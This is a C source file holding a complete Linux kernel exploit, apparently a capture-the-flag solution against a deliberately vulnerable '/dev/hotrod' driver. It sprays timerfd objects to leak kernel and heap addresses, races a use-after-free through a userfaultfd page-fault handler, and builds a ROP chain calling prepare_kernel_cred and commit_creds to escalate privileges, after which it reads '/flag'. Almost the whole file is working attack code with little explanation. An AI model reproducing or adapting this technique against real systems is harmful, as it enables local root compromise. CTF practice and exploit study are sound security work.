/*
Spawn timer 
Clean timer
Alloc chunk
Show chunk - leak content of timer (kzalloc not used!

Free - spawn timer & edit -> rce
userfaultfd 
*/ 
#define _GNU_SOURCE

#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>


#include "userfaultfd.h"
#include <sys/timerfd.h>


#define EXP_MSG   "[...] "
#define EXP_MSG_S "[..2] "

#define DEV_PTH "/dev/hotrod"

#define CMD_ALLOC 0xBAADC0DE
#define CMD_FREE  0xC001C0DE
#define CMD_SHOW  0x1337C0DE
#define CMD_EDIT  0xDEADC0DE

#define ALLOC_SZ  240
#define SPRAY_CNT 6

#define KBASE_OFFSET 0x102a00
#define K256_OFFSET  0x88

#define PG_ADDR      0xBEDA000
#define FAKE_ADDR    0xB0BA000

#define PG_SZ        0x1000

#define G_PIVOTER              162694
#define G_CCREDS               341968
#define G_PCREDS               341632
#define G_pop_rdx_ret          1309110
#define G_call_rdx             8694
#define G_pop_rdi_ret          747677
#define G_iretq                85270
#define G_xchg_call_rcx        7060337
#define G_pop_rcx              1616083
#define G_mov_rdi_rax_call_rbx 860426
#define G_pop_rbx_ret          1308960
#define G_swapgs_pop1_ret      2100588

struct hotrod_req {
    unsigned long size;
    void *content;
};

typedef struct hotrod_req h_req_t;

int cfd;
int usr_fd;
void *kbase;
void *hbase; 

int fds[SPRAY_CNT];

void panic(char *msg) {
    puts(msg);
    
    exit(-1);
}

void dummy() {
    char flag[100];
    read(open("/flag", O_RDONLY), flag, 100);
    puts(flag);
}

void exec_shell() {
    char flag[100];
    read(open("/flag", O_RDONLY), flag, 100);
    puts(flag);
}

void open_device() {
    puts(EXP_MSG "Opening the vulnerable device");

    if((cfd = open(DEV_PTH, O_RDWR)) < 0) {
        panic("failed to open device");
    }
}

// IOCTL interfaces

// kmalloc-256
void h_alloc(int sz) {
    puts(EXP_MSG "allocating");

    if(0xe0 <= sz && sz <= 0xf0) {
        int res = ioctl(cfd, CMD_ALLOC, sz);
        if (res < 0)  {
            panic("failed to allocate hr");
        }
    } else {
        panic("bad size specified");
    }
}

void h_free() {
    puts(EXP_MSG "freeing");

    int res = ioctl(cfd, CMD_FREE);
    if (res < 0)  {
        panic("failed to free hr");
    }
}

void h_show(void *buf, int sz) {
    puts(EXP_MSG "show");

    h_req_t req = {
        .size = sz,
        .content = buf
    };

    int res = ioctl(cfd, CMD_SHOW, &req);
    if (res < 0)  {
        panic("failed to show hr");
    }
}

void h_edit(void *buf, int sz) {
    puts(EXP_MSG "edit");

    h_req_t req = {
        .size = sz,
        .content = buf
    };

    int res = ioctl(cfd, CMD_EDIT, &req);
    if (res < 0)  {
        panic("failed to edit hr");
    }
}

int spawn_timer() {
    puts(EXP_MSG "=> spawning the timer");

    int tfd = timerfd_create(
        CLOCK_REALTIME,
        0
    );

    if(tfd < 0) {
        panic("failed to create timer");
    }
}


void setup_timer(int tfd) {
    struct itimerspec its = {
        .it_interval = {
            .tv_sec = 0,
            .tv_nsec = 0
        },
        .it_value = {
            .tv_sec = 10,
            .tv_nsec = 0
        }
    };


    timerfd_settime(tfd, 0, &its, 0);
}

void kill_timer(tfd) {
    if(close(tfd) < 0) {
        panic("failed to close timer");
    }
}

void dump(void **buf) {
    puts(EXP_MSG "(meow) dumping!");

    for(int i = 0; i < ALLOC_SZ/8; i += 1) {
        if(buf[i] != NULL) {
            printf("[%d] %p\n", i, buf[i]);
        }
    }
}

void mmap_page(void *addr) {
    printf("Allocated page <%p>\n", addr);

    void *na = mmap(
        addr,
        PG_SZ, 
        PROT_READ|PROT_WRITE,
        MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,
        -1,
        0
    );

    if(na == NULL || na != addr) {
        panic("failed to mmap page");
    }
}

int s_userfaultfd(int flags) {
    return syscall(SYS_userfaultfd, flags);
}

int u_reg(void *addr) {
    puts(EXP_MSG "Registering the userfaultfd handler");

    // Open descriptor
    int ufd = s_userfaultfd(O_NONBLOCK);
    if(ufd < 0) {
        panic("failed to register userfaultfd");
    }

    struct uffdio_api api = {
        .api = UFFD_API,
    };

    // Register version
    if(ioctl(ufd, UFFDIO_API, &api) < 0) {
        panic("failed to get UFFD API version");
    }

    if(api.api != UFFD_API) {
        panic("bad UFFD_API version");
    }

    // Register region
    struct uffdio_register reg_req = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range = {
            .start = addr,
            .len = PG_SZ,
        }
    };

    if(ioctl(ufd, UFFDIO_REGISTER, &reg_req) < 0) {
        panic("failed to register region");
    }

    return ufd;
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );

    puts("... saved state :$");
}


void setup_layout(void **buf) {
    puts(EXP_MSG_S "Setting up the layout");


    // В RDI лежит heap base!!!
    buf[0] = (FAKE_ADDR+PG_SZ/2); 
    buf[5] = kbase+G_PIVOTER;

    printf("PEWPEW Returning to <%p>\n", buf[5]);
    
    // preventing DF, storing rop
    unsigned long long *ptr = FAKE_ADDR;
    
    *ptr = 0x0;
    memset(FAKE_ADDR, 'A', PG_SZ);

    
    int place_idx = PG_SZ/16;
    ptr[place_idx] = kbase+G_pop_rdi_ret;
    ptr[++place_idx] = 0x0;
    ptr[++place_idx] = kbase+G_pop_rdx_ret;
    ptr[++place_idx] = kbase+G_PCREDS;
    ptr[++place_idx] = kbase+G_call_rdx;
    ptr[++place_idx] = 0x0;                    // GAP
    ptr[++place_idx] = kbase+G_pop_rbx_ret;
    ptr[++place_idx] = kbase+G_pop_rbx_ret;
    ptr[++place_idx] = kbase+G_mov_rdi_rax_call_rbx;

    ptr[++place_idx] = kbase+G_CCREDS;

    // Returning to userspace
    ptr[++place_idx] = kbase+G_swapgs_pop1_ret;
    ptr[++place_idx] = 0x0;

    ptr[++place_idx] = kbase+G_iretq;
    ptr[++place_idx] = &dummy;
    ptr[++place_idx] = user_cs;
    ptr[++place_idx] = user_rflags;
    ptr[++place_idx] = user_sp;
    ptr[++place_idx] = user_ss;

    printf("iretq: %p\n", kbase+G_iretq);
}


void *handle_reg(void (*arg_f)()) {
    char tempo_buff[PG_SZ];
    memset(tempo_buff, '\x00', PG_SZ);

    puts(EXP_MSG_S "started the handler");

    struct pollfd poll_req = {
        .fd = usr_fd,
        .events = POLLIN
    };

    while(poll(&poll_req, 1, -1)) {
        if((poll_req.revents & POLLERR) || (poll_req.revents & POLLHUP)) {
            panic(EXP_MSG_S "Got bad event from UFD :/");
        }


        struct uffd_msg event_msg;
        if(read(usr_fd, &event_msg, sizeof(event_msg)) != sizeof(event_msg)) {
            panic(EXP_MSG_S "Failed to read event from UFD");
        }

        if(event_msg.event == UFFD_EVENT_PAGEFAULT) {
            if(event_msg.arg.pagefault.address == PG_ADDR) {
                printf(EXP_MSG_S "Whoopsie, got PF on <%p> :)\n", PG_ADDR);

                (*arg_f)();

                // Raise event
                struct uffdio_copy copy_event = {
                    .dst = PG_ADDR,
                    .src = (void *) tempo_buff,
                    .len = PG_SZ
                };

                setup_layout(tempo_buff);

                puts(EXP_MSG_S "Waiting for second and overwriting");
                sleep(1);

                if(ioctl(usr_fd, UFFDIO_COPY, &copy_event)<0) {
                    panic(EXP_MSG_S "failed to release event"); 
                }

                puts(EXP_MSG_S "closing the ufd descriptor");
                close(usr_fd);
                
                exit(0);
            }
        }
    }
}

void _interlocutor() {
    puts("hello, I'm pwnie");

    h_free();

    // On that place timer will be allocated
    int tifd = spawn_timer();
    setup_timer(tifd);
}


void spray_with_timers() {
    for(int i = 0; i < SPRAY_CNT; i += 1) {
        fds[i] = spawn_timer();
        setup_timer(fds[i]);
    }

    for(int i = 0; i < SPRAY_CNT; i += 1) {
        kill_timer(fds[i]);
    }
}


void set_aff() {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);

    if (sched_setaffinity(0, sizeof(cpu_set_t), &set) == -1) {
        perror("sched_setaffinity");
        exit(EXIT_FAILURE);
    }
}

int main() {
    set_aff();
    save_state();

    signal(SIGSEGV, exec_shell);

    pthread_t hdl_pid;
    char buf[ALLOC_SZ];

    // Prepare the exploitation environment
    open_device();

    mmap_page((void *) PG_ADDR);
    mmap_page((void *) FAKE_ADDR);

    usr_fd = u_reg((void *) PG_ADDR);
    pthread_create(&hdl_pid, NULL, handle_reg, (void *) &_interlocutor);


puts("STAGE 1: Leak information");
    // Spray with timers
    spray_with_timers();

    puts(EXP_MSG "waiting for kfree_rcu");
    sleep(3);

    // rule the kmalloc (^z)
    h_alloc(ALLOC_SZ);
    h_show(&buf, ALLOC_SZ);
    dump(buf);

    kbase = ((void **)buf)[5] - KBASE_OFFSET;
    hbase = ((void **)buf)[17] - K256_OFFSET;

    printf("GOTCHA: kbase=%p k256=%p\n", kbase, hbase);


puts("STAGE 2: Got RIP control");

    h_edit(PG_ADDR, ALLOC_SZ);
    

    pthread_join(hdl_pid, NULL);
    return 0;
}